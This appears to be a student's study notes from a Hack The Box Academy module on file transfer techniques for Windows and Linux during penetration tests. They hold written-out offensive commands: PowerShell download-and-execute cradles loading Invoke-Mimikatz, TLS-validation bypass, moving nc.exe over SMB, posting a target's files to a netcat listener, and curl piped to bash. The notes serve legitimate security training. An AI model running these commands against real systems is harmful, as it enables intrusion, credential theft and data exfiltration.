
10-10-2024 12:30 pm

Tags: [[Windows|Windows]] [[Linux]] [[File Transfers]] [[FTP (21)|FTP (21)]] 

References: https://academy.hackthebox.com/module/24/section/160

# File Transfers


## Windows File Transfer Methods
### Microsoft Astaroth Attack
- the file is not present on the system (fileless) but runs in memory
- it uses legitimate tools to hide itself

Steps:
![[fig1a-astaroth-attack-chain.webp]]
- **WMIC (Windows Management Instrumentation Command-line)**:
    - It's a tool that lets you **interact with the Windows system** using commands.
    - With WMIC, you can **gather info** about the system (like processes, hardware) or **execute commands** remotely.
    - In the Astaroth attack, WMIC is used to execute malicious commands **without needing a separate file**, making it harder to detect.
- **BITSAdmin**:
    - It's a command-line tool that uses **Background Intelligent Transfer Service (BITS)** to **download or upload files**.
    - BITS is usually used by Windows for **background updates** (like Windows Update).
    - Attackers abuse BITSAdmin to secretly download **malicious payloads** without raising alarms, blending in with normal background activity.
- **Certutil**:
	- It's a **command-line tool** in Windows used to manage certificates (e.g., display, install, or configure certificates).
	- Cybercriminals abuse it to **download malicious files** because it can be used to retrieve files from remote URLs, which makes it handy for them to bypass defenses.
- **Regsrv32**:
	- **Regsvr32** is a Windows tool used to **register or unregister COM (Component Object Model) DLLs**.
	- Attackers misuse it to run **malicious scripts** by registering remote or local **malicious DLLs or scripts**, and it works in a way that can avoid some security defenses.
#### DLLs
What is a DLL?
- **DLL** stands for **Dynamic Link Library**.
- It’s a type of file in Windows (.dll) that contains **code and data** that can be used by multiple programs **at the same time**.
- Instead of embedding all the code in every program, **DLLs allow shared functionality**, making programs smaller and more efficient.
How DLLs Work:
- **When a program runs**, it can load a DLL **on demand** and use the functions inside it (like printing or file management).
- For example, many programs might use the same **Windows system DLL** for printing without having to re-write all the code.
Why DLLs Are Important:
- **Reusability**: Code written once can be reused by multiple applications.
- **Modularity**: Programs are easier to maintain because functionality is split across different files.
- **Memory Efficiency**: Since multiple programs share DLLs, it saves memory and disk space.
DLL Hijacking (in attacks):
- Attackers can **replace legitimate DLLs** with malicious ones (called **DLL hijacking**) to run **malware** when the application is executed.
### Download Operations (from local to remote)
![[WIN-download-PwnBox.webp]]
#### PowerShell Base64 Encode & Decode
- IF we have access to a terminal remotely, we can encode a file locally and decode it using the remote terminal (PowerShell, md5sum - compute and check MD5 message digest)

Steps:
1) Create the file to transfer (maximum 8,191 characters)
2) Check it's md5 hash with `md5sum`:
```shell-session
md5sum id_rsa

4e301756a07ded0a2dd6953abf015278  id_rsa
```
3) Pipe the file through `base64` encoding:
```shell-session
cat id_rsa |base64 -w 0;echo
```
- `base64 -w 0;echo` encodes the file in `base63` and ensures with `-w 0;echo` that it is in one continuous string
4) Go to the remote terminal PowerShell and decode the file:
```powershell-session
[IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("the base64 string of the file"))
```
- this saves the file after decoding it
5) Confirm that the md5 hashes match:
```powershell-session
Get-FileHash C:\Users\Public\id_rsa -Algorithm md5
```
#### PowerShell Web Downloads
- it's based on `HTTP/HTTPS` outbound connections
- `System.Net.Webclient` class from PowerShell can be used to download files over `HTTP/HTTPS` or even `FTP`

| **Method**                                                                                                               | **Description**                                                                                                            |
| ------------------------------------------------------------------------------------------------------------------------ | -------------------------------------------------------------------------------------------------------------------------- |
| [OpenRead](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.openread?view=net-6.0)                       | Returns the data from a resource as a [Stream](https://docs.microsoft.com/en-us/dotnet/api/system.io.stream?view=net-6.0). |
| [OpenReadAsync](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.openreadasync?view=net-6.0)             | Returns the data from a resource without blocking the calling thread.                                                      |
| [DownloadData](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloaddata?view=net-6.0)               | Downloads data from a resource and returns a Byte array.                                                                   |
| [DownloadDataAsync](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloaddataasync?view=net-6.0)     | Downloads data from a resource and returns a Byte array without blocking the calling thread.                               |
| [DownloadFile](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadfile?view=net-6.0)               | Downloads data from a resource to a local file.                                                                            |
| [DownloadFileAsync](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadfileasync?view=net-6.0)     | Downloads data from a resource to a local file without blocking the calling thread.                                        |
| [DownloadString](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadstring?view=net-6.0)           | Downloads a String from a resource and returns a String.                                                                   |
| [DownloadStringAsync](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadstringasync?view=net-6.0) | Downloads a String from a resource without blocking the calling thread.                                                    |
##### File Download
- for this we have two methods which are almost the same, `Async` and `Sync` (`Async` runs in the background and `Sync` doesn't)
```powershell-session
(New-Object Net.WebClient).DownloadFile('<Target File URL>','<Output File Name>')

(New-Object Net.WebClient).DownloadFileAsync('<Target File URL>','<Output File Name>')
```
##### DownloadString - Fileless Method
- the payload is downloaded and executed directly
- a PowerShell script can be run directly in memory using the `Invoke-Expression` (`IEX` - cmdlet)
```powershell-session
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')
```
OR with pipeline output to `IEX`:
```powershell-session
(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1') | IEX
```
##### PowerShell Invoke-WebRequests
- for PowerShell >= 3.0, but it's slower at downloading files
- `curl`, `wget` or `iwr` can be used instead of the full name
```powershell-session
Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1
```
##### Common PowerShell Errors
- internet explorer first launch hasn't been completed and prevents the download; this can be ==bypassed== using `-UseBasicParsing`
```powershell-session
Invoke-WebRequest https://<ip>/PowerView.ps1 | IEX

ISSUE:
Invoke-WebRequest : The response content cannot be parsed because the Internet Explorer engine is not available, or Internet Explorer's first-launch configuration is not complete. Specify the UseBasicParsing parameter and try again.
At line:1 char:1
+ Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/P ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+ CategoryInfo : NotImplemented: (:) [Invoke-WebRequest], NotSupportedException
+ FullyQualifiedErrorId : WebCmdletIEDomNotSupportedException,Microsoft.PowerShell.Commands.InvokeWebRequestCommand

HOW TO FIX:
Invoke-WebRequest https://<ip>/PowerView.ps1 -UseBasicParsing | IEX
```

- other errors involve downloads related to SSL/TLS secure channels, which can be ==bypassed==
```powershell-session
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')

ISSUE:
Exception calling "DownloadString" with "1" argument(s): "The underlying connection was closed: Could not establish trust
relationship for the SSL/TLS secure channel."
At line:1 char:1
+ IEX(New-Object Net.WebClient).DownloadString('https://raw.githubuserc ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
    + FullyQualifiedErrorId : WebException

HOW TO FIX:
 [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
```
#### SMB Download
- first we need to create an SMB server with `smbserver.py` from Impacket
```shell-session
sudo impacket-smbserver share -smb2support /tmp/smbshare

Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```
- then we need to copy the file/s from the SMB server (this can be done on the remote CMD)
```cmd-session
copy \\192.168.220.133\share\nc.exe

        1 file(s) copied.
```
==Note: Newer versions can block unauthenticated guest access.==
```cmd-session
copy \\192.168.220.133\share\nc.exe

You can't access this shared folder because your organization's security policies block unauthenticated guest access. These policies help protect your PC from unsafe or malicious devices on the network.
```
- this can be solved by creating on our local machine an SMB server and mount it on the remote Windows target machine
```shell-session
sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test

Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```
- this solves the issue of unauthenticated guest access
- now mount the SMB server on the Windows machine like this:
```cmd-session
net use n: \\192.168.220.133\share /user:test test

The command completed successfully.

copy n:\nc.exe
        1 file(s) copied.
```
#### FTP Download
- can be done by using the Python3's `pyftpdlib` module
```shell-session
sudo pip3 install pyftpdlib
```
- how to set up the FTP server locally:
```shell-session
sudo python3 -m pyftpdlib --port 21

[I 2022-05-17 10:09:19] concurrency model: async
[I 2022-05-17 10:09:19] masquerade (NAT) address: None
[I 2022-05-17 10:09:19] passive ports: None
[I 2022-05-17 10:09:19] >>> starting FTP server on 0.0.0.0:21, pid=3210 <<<
```
- after that, on the Windows remote target machine, we can use `Net.WebClient`
```powershell-session
(New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'C:\Users\Public\ftp-file.txt')
```

IF WE DO NOT HAVE INTERACTIVE SHELL:
```cmd-session
C:\htb> echo open 192.168.49.128 > ftpcommand.txt
C:\htb> echo USER anonymous >> ftpcommand.txt
C:\htb> echo binary >> ftpcommand.txt
C:\htb> echo GET file.txt >> ftpcommand.txt
C:\htb> echo bye >> ftpcommand.txt
C:\htb> ftp -v -n -s:ftpcommand.txt
ftp> open 192.168.49.128
Log in with USER and PASS first.
ftp> USER anonymous

ftp> GET file.txt
ftp> bye

C:\htb>more file.txt
This is a test file
```
- **Create `ftpcommand.txt` with FTP commands:**
    - `echo open 192.168.49.128 > ftpcommand.txt`
        - Writes `open 192.168.49.128` into `ftpcommand.txt` (starts FTP connection to that IP).
    - `echo USER anonymous >> ftpcommand.txt`
        - Appends `USER anonymous` to the file (logs in anonymously).
    - `echo binary >> ftpcommand.txt`
        - Appends `binary` (sets transfer mode to binary).
    - `echo GET file.txt >> ftpcommand.txt`
        - Appends `GET file.txt` (downloads `file.txt` from the server).
    - `echo bye >> ftpcommand.txt`
        - Appends `bye` (closes the FTP session).
- **Execute the FTP script:**
    - `ftp -v -n -s:ftpcommand.txt`
        - Runs FTP in verbose mode (`-v`), prevents auto-login (`-n`), and executes commands from `ftpcommand.txt` (`-s`).
- **View the downloaded file:**
    - `more file.txt`
        - Displays the contents of `file.txt`, which is `This is a test file`.
### Upload Operations (from remote to local)
#### PowerShell Base64 Encode & Decode
- encoding:
```powershell-session
[Convert]::ToBase64String((Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte))

IyBDb3B5cmlnaHQgKGMpIDE5OTMtMjAwOSBNaWNyb3NvZnQgQ29ycC4NCiMNCiMgVGhpcyBpcyBhIHNhbXBsZSBIT1NUUyBmaWxlIHVzZWQgYnkgTWljcm9zb2Z0IFRDUC9JUCBmb3IgV2luZG93cy4NCiMNCiMgVGhpcyBmaWxlIGNvbnRhaW5zIHRoZSBtYXBwaW5ncyBvZiBJUCBhZGRyZXNzZXMgdG8gaG9zdCBuYW1lcy4gRWFjaA0KIyBlbnRyeSBzaG91bGQgYmUga2VwdCBvbiBhbiBpbmRpdmlkdWFsIGxpbmUuIFRoZSBJUCBhZGRyZXNzIHNob3VsZA0KIyBiZSBwbGFjZWQgaW4gdGhlIGZpcnN0IGNvbHVtbiBmb2xsb3dlZCBieSB0aGUgY29ycmVzcG9uZGluZyBob3N0IG5hbWUuDQojIFRoZSBJUCBhZGRyZXNzIGFuZCB0aGUgaG9zdCBuYW1lIHNob3VsZCBiZSBzZXBhcmF0ZWQgYnkgYXQgbGVhc3Qgb25lDQojIHNwYWNlLg0KIw0KIyBBZGRpdGlvbmFsbHksIGNvbW1lbnRzIChzdWNoIGFzIHRoZXNlKSBtYXkgYmUgaW5zZXJ0ZWQgb24gaW5kaXZpZHVhbA0KIyBsaW5lcyBvciBmb2xsb3dpbmcgdGhlIG1hY2hpbmUgbmFtZSBkZW5vdGVkIGJ5IGEgJyMnIHN5bWJvbC4NCiMNCiMgRm9yIGV4YW1wbGU6DQojDQojICAgICAgMTAyLjU0Ljk0Ljk3ICAgICByaGluby5hY21lLmNvbSAgICAgICAgICAjIHNvdXJjZSBzZXJ2ZXINCiMgICAgICAgMzguMjUuNjMuMTAgICAgIHguYWNtZS5jb20gICAgICAgICAgICAgICMgeCBjbGllbnQgaG9zdA0KDQojIGxvY2FsaG9zdCBuYW1lIHJlc29sdXRpb24gaXMgaGFuZGxlZCB3aXRoaW4gRE5TIGl0c2VsZi4NCiMJMTI3LjAuMC4xICAgICAgIGxvY2FsaG9zdA0KIwk6OjEgICAgICAgICAgICAgbG9jYWxob3N0DQo=
PS C:\htb> Get-FileHash "C:\Windows\system32\drivers\etc\hosts" -Algorithm MD5 | select Hash

Hash
----
3688374325B992DEF12793500307566D
```
- copy the content and paste it locally, then use `base64` to decode it and check the hash with `md5sum` to confirm the transfer is correct
- decoding:
```shell-session
echo IyBDb3B5cmlnaHQgKGMpIDE5OTMtMjAwOSBNaWNyb3NvZnQgQ29ycC4NCiMNCiMgVGhpcyBpcyBhIHNhbXBsZSBIT1NUUyBmaWxlIHVzZWQgYnkgTWljcm9zb2Z0IFRDUC9JUCBmb3IgV2luZG93cy4NCiMNCiMgVGhpcyBmaWxlIGNvbnRhaW5zIHRoZSBtYXBwaW5ncyBvZiBJUCBhZGRyZXNzZXMgdG8gaG9zdCBuYW1lcy4gRWFjaA0KIyBlbnRyeSBzaG91bGQgYmUga2VwdCBvbiBhbiBpbmRpdmlkdWFsIGxpbmUuIFRoZSBJUCBhZGRyZXNzIHNob3VsZA0KIyBiZSBwbGFjZWQgaW4gdGhlIGZpcnN0IGNvbHVtbiBmb2xsb3dlZCBieSB0aGUgY29ycmVzcG9uZGluZyBob3N0IG5hbWUuDQojIFRoZSBJUCBhZGRyZXNzIGFuZCB0aGUgaG9zdCBuYW1lIHNob3VsZCBiZSBzZXBhcmF0ZWQgYnkgYXQgbGVhc3Qgb25lDQojIHNwYWNlLg0KIw0KIyBBZGRpdGlvbmFsbHksIGNvbW1lbnRzIChzdWNoIGFzIHRoZXNlKSBtYXkgYmUgaW5zZXJ0ZWQgb24gaW5kaXZpZHVhbA0KIyBsaW5lcyBvciBmb2xsb3dpbmcgdGhlIG1hY2hpbmUgbmFtZSBkZW5vdGVkIGJ5IGEgJyMnIHN5bWJvbC4NCiMNCiMgRm9yIGV4YW1wbGU6DQojDQojICAgICAgMTAyLjU0Ljk0Ljk3ICAgICByaGluby5hY21lLmNvbSAgICAgICAgICAjIHNvdXJjZSBzZXJ2ZXINCiMgICAgICAgMzguMjUuNjMuMTAgICAgIHguYWNtZS5jb20gICAgICAgICAgICAgICMgeCBjbGllbnQgaG9zdA0KDQojIGxvY2FsaG9zdCBuYW1lIHJlc29sdXRpb24gaXMgaGFuZGxlZCB3aXRoaW4gRE5TIGl0c2VsZi4NCiMJMTI3LjAuMC4xICAgICAgIGxvY2FsaG9zdA0KIwk6OjEgICAgICAgICAgICAgbG9jYWxob3N0DQo= | base64 -d > hosts
```
- `-d` for decoding
- now check the hash:
```shell-session
md5sum hosts 

3688374325b992def12793500307566d  hosts
```
#### PowerShell Web Uploads
- first we need to install locally a python3 module `HTTP.server`:
```shell-session
pip3 install uploadserver

Collecting upload server
  Using cached uploadserver-2.0.1-py3-none-any.whl (6.9 kB)
Installing collected packages: uploadserver
Successfully installed uploadserver-2.0.1
```
- then we have to start the upload server:
```shell-session
python3 -m uploadserver

File upload available at /upload
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```
- now we can use a PowerShell script, `PSUpload.ps1` which allows us to perform upload operations:
```powershell-session
PS C:\htb> IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
PS C:\htb> Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\Windows\System32\drivers\etc\hosts

[+] File Uploaded:  C:\Windows\System32\drivers\etc\hosts
[+] FileHash:  5E7241D66FD77E9E8EA866B6278B2373
```
#### PowerShell Base64 Web Upload
- first we encode the files to Base64 and then use PowerShell to make POST requests to our local server:
```powershell-session
PS C:\htb> $b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))
PS C:\htb> Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64
```
- then we catch the requests with Netcat:
```shell-session
TonyS23@htb[/htb]$ nc -lvnp 8000

listening on [any] 8000 ...
connect to [192.168.49.128] from (UNKNOWN) [192.168.49.129] 50923
POST / HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.19041.1682
Content-Type: application/x-www-form-urlencoded
Host: 192.168.49.128:8000
Content-Length: 1820
Connection: Keep-Alive

IyBDb3B5cmlnaHQgKGMpIDE5OTMtMjAwOSBNaWNyb3NvZnQgQ29ycC4NCiMNCiMgVGhpcyBpcyBhIHNhbXBsZSBIT1NUUyBmaWxlIHVzZWQgYnkgTWljcm9zb2Z0IFRDUC9JUCBmb3IgV2luZG93cy4NCiMNCiMgVGhpcyBmaWxlIGNvbnRhaW5zIHRoZSBtYXBwaW5ncyBvZiBJUCBhZGRyZXNzZXMgdG8gaG9zdCBuYW1lcy4gRWFjaA0KIyBlbnRyeSBzaG91bGQgYmUga2VwdCBvbiBhbiBpbmRpdmlkdWFsIGxpbmUuIFRoZSBJUCBhZGRyZXNzIHNob3VsZA0KIyBiZSBwbGFjZWQgaW4gdGhlIGZpcnN0IGNvbHVtbiBmb2xsb3dlZCBieSB0aGUgY29ycmVzcG9uZGluZyBob3N0IG5hbWUuDQojIFRoZSBJUCBhZGRyZXNzIGFuZCB0aGUgaG9zdCBuYW1lIHNob3VsZCBiZSBzZXBhcmF0ZWQgYnkgYXQgbGVhc3Qgb25lDQo
...SNIP...
```
- then we decode the file:
```shell-session
TonyS23@htb[/htb]$ echo <base64> | base64 -d -w 0 > hosts
```
#### SMB Uploads
- usually, companies allow mostly HTTP (TCP/80) and HTTPS (TCP/443) to have outbound connections and usually block the SMB (TCP/445)
- the alternative is to run SMB over HTTP with `WebDav.WebDAV (RFC 4918)` - this is an internet protocol that allows web browsers and web servers to communicate with each other
- first, to configure the WebDav server, we have to install a python3 module:
```shell-session
TonyS23@htb[/htb]$ sudo pip3 install wsgidav cheroot

[sudo] password for plaintext: 
Collecting wsgidav
  Downloading WsgiDAV-4.0.1-py3-none-any.whl (171 kB)
     |████████████████████████████████| 171 kB 1.4 MB/s
     ...SNIP...
```
- how to use the WebDav module:
```shell-session
TonyS23@htb[/htb]$ sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous 

[sudo] password for plaintext: 
Running without configuration file.
10:02:53.949 - WARNING : App wsgidav.mw.cors.Cors(None).is_disabled() returned True: skipping.
10:02:53.950 - INFO    : WsgiDAV/4.0.1 Python/3.9.2 Linux-5.15.0-15parrot1-amd64-x86_64-with-glibc2.31
10:02:53.950 - INFO    : Lock manager:      LockManager(LockStorageDict)
10:02:53.950 - INFO    : Property manager:  None
10:02:53.950 - INFO    : Domain controller: SimpleDomainController()
10:02:53.950 - INFO    : Registered DAV providers by route:
10:02:53.950 - INFO    :   - '/:dir_browser': FilesystemProvider for path '/usr/local/lib/python3.9/dist-packages/wsgidav/dir_browser/htdocs' (Read-Only) (anonymous)
10:02:53.950 - INFO    :   - '/': FilesystemProvider for path '/tmp' (Read-Write) (anonymous)
10:02:53.950 - WARNING : Basic authentication is enabled: It is highly recommended to enable SSL.
10:02:53.950 - WARNING : Share '/' will allow anonymous write access.
10:02:53.950 - WARNING : Share '/:dir_browser' will allow anonymous read access.
10:02:54.194 - INFO    : Running WsgiDAV/4.0.1 Cheroot/8.6.0 Python 3.9.2
10:02:54.194 - INFO    : Serving on http://0.0.0.0:80 ...
```
- how to connect to the WebDav share:
```cmd-session
C:\htb> dir \\192.168.49.128\DavWWWRoot

 Volume in drive \\192.168.49.128\DavWWWRoot has no label.
 Volume Serial Number is 0000-0000

 Directory of \\192.168.49.128\DavWWWRoot

05/18/2022  10:05 AM    <DIR>          .
05/18/2022  10:05 AM    <DIR>          ..
05/18/2022  10:05 AM    <DIR>          sharefolder
05/18/2022  10:05 AM                13 filetest.txt
               1 File(s)             13 bytes
               3 Dir(s)  43,443,318,784 bytes free
```
==**Note:** `DavWWWRoot` is a special keyword recognized by the Windows Shell. No such folder exists on your WebDAV server. The DavWWWRoot keyword tells the Mini-Redirector driver, which handles WebDAV requests that you are connecting to the root of the WebDAV server.
You can avoid using this keyword if you specify a folder that exists on your server when connecting to the server. For example: \\192.168.49.128\\sharefolder==
- how to upload files using SMB:
```cmd-session
C:\htb> copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\DavWWWRoot\
C:\htb> copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\sharefolder\
```
#### FTP Uploads
- when opening an FTP server for uploading, we have to specify `--write`:
```shell-session
TonyS23@htb[/htb]$ sudo python3 -m pyftpdlib --port 21 --write

/usr/local/lib/python3.9/dist-packages/pyftpdlib/authorizers.py:243: RuntimeWarning: write permissions assigned to anonymous user.
  warnings.warn("write permissions assigned to anonymous user.",
[I 2022-05-18 10:33:31] concurrency model: async
[I 2022-05-18 10:33:31] masquerade (NAT) address: None
[I 2022-05-18 10:33:31] passive ports: None
[I 2022-05-18 10:33:31] >>> starting FTP server on 0.0.0.0:21, pid=5155 <<<
```
- this way, we can upload files on the server
 - how to upload:
```powershell-session
PS C:\htb> (New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')
```

IF WE DO NOT HAVE INTERACTIVE SHELL:
```cmd-session
C:\htb> echo open 192.168.49.128 > ftpcommand.txt
C:\htb> echo USER anonymous >> ftpcommand.txt
C:\htb> echo binary >> ftpcommand.txt
C:\htb> echo PUT c:\windows\system32\drivers\etc\hosts >> ftpcommand.txt
C:\htb> echo bye >> ftpcommand.txt
C:\htb> ftp -v -n -s:ftpcommand.txt
ftp> open 192.168.49.128

Log in with USER and PASS first.


ftp> USER anonymous
ftp> PUT c:\windows\system32\drivers\etc\hosts
ftp> bye
```
## Linux File Transfer Methods
- most malware uses HTTP or HTTPS to communicate
### Download Operations
![[LinuxDownloadUpload.webp]]
#### Base64 Encoding & Decoding
- it's the same as the Windows transfer but with Linux commands
- create the file and check the hash:
```shell-session
TonyS23@htb[/htb]$ md5sum id_rsa

4e301756a07ded0a2dd6953abf015278  id_rsa
```
- encode it locally:
```shell-session
TonyS23@htb[/htb]$ cat id_rsa |base64 -w 0;echo

LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFsd0FBQUFkemMyZ3RjbgpOaEFBQUFBd0VBQVFBQUFJRUF6WjE0dzV1NU9laHR5SUJQSkg3Tm9Yai84YXNHRUcxcHpJbmtiN2hIMldRVGpMQWRYZE9kCno3YjJtd0tiSW56VmtTM1BUR3ZseGhDVkRRUmpBYzloQ3k1Q0duWnlLM3U2TjQ3RFhURFY0YUtkcXl0UTFUQXZZUHQwWm8KVWh2bEo5YUgxclgzVHUxM2FRWUNQTVdMc2JOV2tLWFJzSk11dTJONkJoRHVmQThhc0FBQUlRRGJXa3p3MjFwTThBQUFBSApjM05vTFhKellRQUFBSUVBeloxNHc1dTVPZWh0eUlCUEpIN05vWGovOGFzR0VHMXB6SW5rYjdoSDJXUVRqTEFkWGRPZHo3CmIybXdLYkluelZrUzNQVEd2bHhoQ1ZEUVJqQWM5aEN5NUNHblp5SzN1Nk40N0RYVERWNGFLZHF5dFExVEF2WVB0MFpvVWgKdmxKOWFIMXJYM1R1MTNhUVlDUE1XTHNiTldrS1hSc0pNdXUyTjZCaER1ZkE4YXNBQUFBREFRQUJBQUFBZ0NjQ28zRHBVSwpFdCtmWTZjY21JelZhL2NEL1hwTlRsRFZlaktkWVFib0ZPUFc5SjBxaUVoOEpyQWlxeXVlQTNNd1hTWFN3d3BHMkpvOTNPCllVSnNxQXB4NlBxbFF6K3hKNjZEdzl5RWF1RTA5OXpodEtpK0pvMkttVzJzVENkbm92Y3BiK3Q3S2lPcHlwYndFZ0dJWVkKZW9VT2hENVJyY2s5Q3J2TlFBem9BeEFBQUFRUUNGKzBtTXJraklXL09lc3lJRC9JQzJNRGNuNTI0S2NORUZ0NUk5b0ZJMApDcmdYNmNoSlNiVWJsVXFqVEx4NmIyblNmSlVWS3pUMXRCVk1tWEZ4Vit0K0FBQUFRUURzbGZwMnJzVTdtaVMyQnhXWjBNCjY2OEhxblp1SWc3WjVLUnFrK1hqWkdqbHVJMkxjalRKZEd4Z0VBanhuZEJqa0F0MExlOFphbUt5blV2aGU3ekkzL0FBQUEKUVFEZWZPSVFNZnQ0R1NtaERreWJtbG1IQXRkMUdYVitOQTRGNXQ0UExZYzZOYWRIc0JTWDJWN0liaFA1cS9yVm5tVHJRZApaUkVJTW84NzRMUkJrY0FqUlZBQUFBRkhCc1lXbHVkR1Y0ZEVCamVXSmxjbk53WVdObEFRSURCQVVHCi0tLS0tRU5EIE9QRU5TU0ggUFJJVkFURSBLRVktLS0tLQo=
```
- decode it remotely:
```shell-session
TonyS23@htb[/htb]$ echo -n 'LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFsd0FBQUFkemMyZ3RjbgpOaEFBQUFBd0VBQVFBQUFJRUF6WjE0dzV1NU9laHR5SUJQSkg3Tm9Yai84YXNHRUcxcHpJbmtiN2hIMldRVGpMQWRYZE9kCno3YjJtd0tiSW56VmtTM1BUR3ZseGhDVkRRUmpBYzloQ3k1Q0duWnlLM3U2TjQ3RFhURFY0YUtkcXl0UTFUQXZZUHQwWm8KVWh2bEo5YUgxclgzVHUxM2FRWUNQTVdMc2JOV2tLWFJzSk11dTJONkJoRHVmQThhc0FBQUlRRGJXa3p3MjFwTThBQUFBSApjM05vTFhKellRQUFBSUVBeloxNHc1dTVPZWh0eUlCUEpIN05vWGovOGFzR0VHMXB6SW5rYjdoSDJXUVRqTEFkWGRPZHo3CmIybXdLYkluelZrUzNQVEd2bHhoQ1ZEUVJqQWM5aEN5NUNHblp5SzN1Nk40N0RYVERWNGFLZHF5dFExVEF2WVB0MFpvVWgKdmxKOWFIMXJYM1R1MTNhUVlDUE1XTHNiTldrS1hSc0pNdXUyTjZCaER1ZkE4YXNBQUFBREFRQUJBQUFBZ0NjQ28zRHBVSwpFdCtmWTZjY21JelZhL2NEL1hwTlRsRFZlaktkWVFib0ZPUFc5SjBxaUVoOEpyQWlxeXVlQTNNd1hTWFN3d3BHMkpvOTNPCllVSnNxQXB4NlBxbFF6K3hKNjZEdzl5RWF1RTA5OXpodEtpK0pvMkttVzJzVENkbm92Y3BiK3Q3S2lPcHlwYndFZ0dJWVkKZW9VT2hENVJyY2s5Q3J2TlFBem9BeEFBQUFRUUNGKzBtTXJraklXL09lc3lJRC9JQzJNRGNuNTI0S2NORUZ0NUk5b0ZJMApDcmdYNmNoSlNiVWJsVXFqVEx4NmIyblNmSlVWS3pUMXRCVk1tWEZ4Vit0K0FBQUFRUURzbGZwMnJzVTdtaVMyQnhXWjBNCjY2OEhxblp1SWc3WjVLUnFrK1hqWkdqbHVJMkxjalRKZEd4Z0VBanhuZEJqa0F0MExlOFphbUt5blV2aGU3ekkzL0FBQUEKUVFEZWZPSVFNZnQ0R1NtaERreWJtbG1IQXRkMUdYVitOQTRGNXQ0UExZYzZOYWRIc0JTWDJWN0liaFA1cS9yVm5tVHJRZApaUkVJTW84NzRMUkJrY0FqUlZBQUFBRkhCc1lXbHVkR1Y0ZEVCamVXSmxjbk53WVdObEFRSURCQVVHCi0tLS0tRU5EIE9QRU5TU0ggUFJJVkFURSBLRVktLS0tLQo=' | base64 -d > id_rsa
```
- check the hash remotely:
```shell-session
TonyS23@htb[/htb]$ md5sum id_rsa

4e301756a07ded0a2dd6953abf015278  id_rsa
```
==**Note:** You can also upload files using the reverse operation. From your compromised target cat and base64 encode a file and decode it in your Pwnbox.==
#### Web Downloads with Wget and cURL
- to download the file with Wget:
```shell-session
TonyS23@htb[/htb]$ wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh
```
- `-O` specifies where to output the result
- to download a file with cURL:
```shell-session
TonyS23@htb[/htb]$ curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
```
#### Fileless Attacks Using Linux
- by using cURL:
```shell-session
TonyS23@htb[/htb]$ curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash
```
- the result is directly piped to `bash` to be executed
- by using Wget:
```shell-session
TonyS23@htb[/htb]$ wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3

Hello World!
```
- `-qO` for quiet mode and standard output
- again, we pipe the python script directly into python3
